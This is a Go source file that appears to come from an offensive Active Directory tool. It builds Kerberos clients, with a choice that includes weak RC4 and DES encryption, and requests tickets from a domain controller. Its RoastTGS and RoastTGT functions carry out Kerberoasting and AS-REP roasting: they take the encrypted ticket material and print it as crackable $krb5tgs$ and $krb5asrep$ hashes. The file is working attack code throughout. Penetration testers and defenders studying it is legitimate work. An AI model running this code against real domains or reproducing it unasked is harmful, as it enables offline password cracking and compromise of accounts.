package cmd

import (
	"encoding/hex"
	"fmt"
	"log"
	"strings"

	"github.com/doubledeed-sec/gokrb5/v8/client"
	"github.com/doubledeed-sec/gokrb5/v8/config"
	"github.com/doubledeed-sec/gokrb5/v8/krberror"
	"github.com/doubledeed-sec/gokrb5/v8/messages"
	"github.com/doubledeed-sec/gokrb5/v8/types"
)

func NewCl(username string, password string, domain string, dcip string, enc string) *client.Client {
	encTypes := map[string]string{
		"rc4":    "rc4-hmac",
		"desCRC": "des-cbc-crc",
		"desMD5": "des-cbc-md5",
		"aes128": "aes128-cts-hmac-sha1-96",
		"aes256": "aes256-cts-hmac-sha1-96",
	}
	encSplit := strings.Split(enc, ",")
	var encActual []string
	for _, e := range encSplit {
		encActual = append(encActual, encTypes[e])
	}
	encFinal := strings.Join(encActual, " ")

	//make configs
	var confstr string
	if dcip != "" {
		confstr = fmt.Sprintf(
			`[libdefaults]
default_realm = %s
default_tgs_enctypes = %s
default_tkt_enctypes = %s
permitted_enctypes = %s 
[realms]
%s = {
	kdc = %s:88
	admin_server = %s
	default_domain = %s
}
`, domain, encFinal, encFinal, encFinal, domain, dcip, domain, domain)
	} else if domain != "" {
		confstr = fmt.Sprintf(
			`dns_lookup_kdc = true
dns_lookup_realm = true
default_realm = %s
[libdefaults]
default_tgs_enctypes = %s
default_tkt_enctypes = %s
permitted_enctypes = %s
[realms]
%s = {
	kdc = %s:88
	default_domain = %s
	admin_server = %s
}
`, domain, encFinal, encFinal, encFinal, domain, domain, domain, domain)
	} else {
		fmt.Println("Could not initialise client")
	}

	conf, err := config.NewFromString(confstr)
	if err != nil {
		log.Fatal("Could not parse kerberos config")
	}

	cl := client.NewWithPassword(username, domain, password, conf, client.DisablePAFXFAST(true))

	return cl
}

func GetASRep(cl *client.Client) messages.ASRep {
	if ok, err := cl.IsConfigured(); !ok {
		log.Fatal(err.Error())
	}
	ASReq, err := messages.NewASReqForTGT(cl.Credentials.Domain(), cl.Config, cl.Credentials.CName())
	if err != nil {
		log.Fatal(krberror.Errorf(err, krberror.KRBMsgError, "error generating new AS_REQ"))
	}
	bytes, err := ASReq.Marshal()
	if err != nil {
		log.Fatal(err.Error())
	}
	res, err := cl.SendToKDC(bytes, cl.Credentials.Domain())
	if err != nil {
		log.Fatal(err.Error())
	}
	var ASRep messages.ASRep
	errASRep := ASRep.Unmarshal(res)
	if errASRep != nil {
		log.Fatal(err.Error())
	}

	return ASRep
}

func GetTGT(cl *client.Client) messages.ASRep {
	if ok, err := cl.IsConfigured(); !ok {
		log.Fatal(err.Error())
	}
	ASReq, err := messages.NewASReqForTGT(cl.Credentials.Domain(), cl.Config, cl.Credentials.CName())
	if err != nil {
		log.Fatal(krberror.Errorf(err, krberror.KRBMsgError, "error generating new AS_REQ"))
	}
	ASRep, err := cl.ASExchange(cl.Credentials.Domain(), ASReq, 0)
	if err != nil {
		log.Fatal(err.Error())
	}
	fmt.Println("[+] Got TGT")
	fmt.Printf("  - Start Time: %s\n", ASRep.DecryptedEncPart.StartTime)
	fmt.Printf("  - End Time: %s\n", ASRep.DecryptedEncPart.EndTime)
	fmt.Printf("  - Enc Type: %d\n", ASRep.EncPart.EType)
	fmt.Printf("  - CName: %s\n", strings.Join(ASRep.CName.NameString, "/"))
	fmt.Printf("  - SName: %s\n", strings.Join(ASRep.DecryptedEncPart.SName.NameString, "/"))

	return ASRep
}

func GetTGS(cl *client.Client, tgt messages.ASRep, spnstring string, domain string) messages.TGSRep {
	spn, _ := types.ParseSPNString(spnstring)

	tgsReq, err := messages.NewTGSReq(cl.Credentials.CName(), domain, cl.Config, tgt.Ticket, tgt.DecryptedEncPart.Key, spn, false)
	if err != nil {
		log.Println(err.Error())
	}
	tgsReq, tgsRep, err := cl.TGSExchange(tgsReq, domain, tgt.Ticket, tgt.DecryptedEncPart.Key, 0)
	if err != nil {
		log.Println(err.Error())
	}

	fmt.Println("[+] Got TGS")
	fmt.Printf("  - Start Time: %s\n", tgsRep.DecryptedEncPart.StartTime)
	fmt.Printf("  - End Time: %s\n", tgsRep.DecryptedEncPart.EndTime)
	fmt.Printf("  - Enc Type: %d\n", tgsRep.EncPart.EType)
	fmt.Printf("  - CName: %s\n", strings.Join(tgsRep.CName.NameString, "/"))
	fmt.Printf("  - SName: %s\n", strings.Join(tgsRep.DecryptedEncPart.SName.NameString, "/"))
	fmt.Printf("  - Domain: %s\n", tgsRep.CRealm)

	return tgsRep
}

func RoastTGS(tgsRep messages.TGSRep, krbUsername string) {
	fmt.Println("[+] Kerberoasting")
	fmt.Printf("  - User: %s@%s\n", krbUsername, tgsRep.CRealm)
	fmt.Printf("  - Enc Type: %d\n", tgsRep.Ticket.EncPart.EType)
	crackme := strings.ToUpper(hex.EncodeToString(tgsRep.Ticket.EncPart.Cipher))
	if int32(tgsRep.Ticket.EncPart.EType) == 17 || int32(tgsRep.Ticket.EncPart.EType) == 18 {
		fmt.Printf("  - Hash: $krb5tgs$%d$%s$%s$*%s*$%s$%s\n", tgsRep.Ticket.EncPart.EType, krbUsername, tgsRep.CRealm, strings.Join(tgsRep.DecryptedEncPart.SName.NameString, "/"), crackme[len(crackme)-24:], crackme[:len(crackme)-24])
	} else if int32(tgsRep.Ticket.EncPart.EType) == 23 {
		fmt.Printf("  - Hash: $krb5tgs$%d$*%s$%s$%s*$%s$%s\n", tgsRep.Ticket.EncPart.EType, krbUsername, tgsRep.CRealm, strings.Join(tgsRep.DecryptedEncPart.SName.NameString, "/"), crackme[:32], crackme[32:])
	} else {
		fmt.Println("Encryption Type not supported")
	}
}

func RoastTGT(asRep messages.ASRep) {
	fmt.Println("[+] ASReproasting")
	fmt.Printf("  - User: %s@%s\n", asRep.CName.NameString[0], asRep.CRealm)
	fmt.Printf("  - Enc Type: %d\n", asRep.EncPart.EType)
	crackme := strings.ToUpper(hex.EncodeToString(asRep.EncPart.Cipher))
	fmt.Printf("  - Hash: $krb5asrep$%d$%s@%s:%s$%s\n", asRep.EncPart.EType, asRep.CName.NameString[0], asRep.CRealm, crackme[:32], crackme[32:])

}
